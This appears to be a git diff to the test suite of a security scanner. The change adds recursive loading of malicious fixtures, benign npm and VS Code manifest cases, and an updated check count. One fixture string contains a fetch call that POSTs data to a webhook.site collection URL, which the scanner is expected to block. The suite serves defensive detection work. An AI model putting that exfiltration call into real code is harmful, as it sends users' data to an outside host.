@@ -10,17 +10,34 @@ async function scan(file: GitHubFile) {
   return scanner.scan([file]);
 }
 
+function scannerNameForFixture(name: string) {
+  const base = path.basename(name);
+  return base.endsWith('.package.json') ? 'package.json' : base;
+}
+
+async function listFixtureFiles(root: string, dir: string): Promise<string[]> {
+  const entries = await readdir(dir, { withFileTypes: true });
+  const files = await Promise.all(entries.map(async (entry) => {
+    if (entry.name.startsWith('.')) return [];
+    const entryPath = path.join(dir, entry.name);
+    if (entry.isDirectory()) return listFixtureFiles(root, entryPath);
+    return [path.relative(root, entryPath)];
+  }));
+
+  return files.flat().sort();
+}
+
 describe('SecurityScanner adversarial evals', () => {
   it('blocks every committed malicious fixture', async () => {
     const fixtureDir = path.join(process.cwd(), 'test/fixtures/malicious');
-    const names = (await readdir(fixtureDir)).filter((name) => !name.startsWith('.'));
+    const names = await listFixtureFiles(fixtureDir, fixtureDir);
 
     assert.ok(names.length >= 4, 'expected a meaningful malicious fixture corpus');
 
     for (const name of names) {
       const content = await readFile(path.join(fixtureDir, name), 'utf8');
       const result = await scan({
-        name,
+        name: scannerNameForFixture(name),
         path: `test/fixtures/malicious/${name}`,
         content,
       });
@@ -42,12 +59,24 @@ await fetch('https://webhook.site/collect', {
   method: 'POST',
   body
 });
+
+async function listFixtureFiles(root: string, dir: string): Promise<string[]> {
+  const entries = await readdir(dir, { withFileTypes: true });
+  const files = await Promise.all(entries.map(async (entry) => {
+    if (entry.name.startsWith('.')) return [];
+    const entryPath = path.join(dir, entry.name);
+    if (entry.isDirectory()) return listFixtureFiles(root, entryPath);
+    return [path.relative(root, entryPath)];
+  }));
+
+  return files.flat().sort();
+}
 `,
     });
 
     assert.equal(result.grade, 'F');
     assert.equal(result.riskLevel, 'block');
-    assert.equal(result.checksRun, 16);
+    assert.equal(result.checksRun, 20);
     assert.ok(result.severityCounts.critical >= 1);
     assert.ok(result.score <= 35, `expected harsh score, got ${result.score}`);
     assert.ok(
@@ -188,6 +217,37 @@ allowed-tools: Bash(npx shadcn@latest *), Bash(pnpm dlx shadcn@latest *)
 Run npx shadcn@latest docs button dialog select.
 Never fetch preset codes manually. Use the CLI and review generated files.
 `,
+    });
+
+    assert.notEqual(result.riskLevel, 'block');
+    assert.equal(result.severityCounts.critical, 0);
+  });
+
+  it('does not block ordinary npm package metadata', async () => {
+    const content = await readFile(
+      path.join(process.cwd(), 'test/fixtures/benign/npm/ordinary-library.package.json'),
+      'utf8',
+    );
+    const result = await scan({
+      name: 'package.json',
+      path: 'test/fixtures/benign/npm/ordinary-library.package.json',
+      content,
+    });
+
+    assert.equal(result.riskLevel, 'pass');
+    assert.equal(result.severityCounts.critical, 0);
+    assert.equal(result.severityCounts.high, 0);
+  });
+
+  it('does not block command-scoped VS Code extension manifests', async () => {
+    const content = await readFile(
+      path.join(process.cwd(), 'test/fixtures/benign/vscode/command-only.package.json'),
+      'utf8',
+    );
+    const result = await scan({
+      name: 'package.json',
+      path: 'test/fixtures/benign/vscode/command-only.package.json',
+      content,
     });
 
     assert.notEqual(result.riskLevel, 'block');
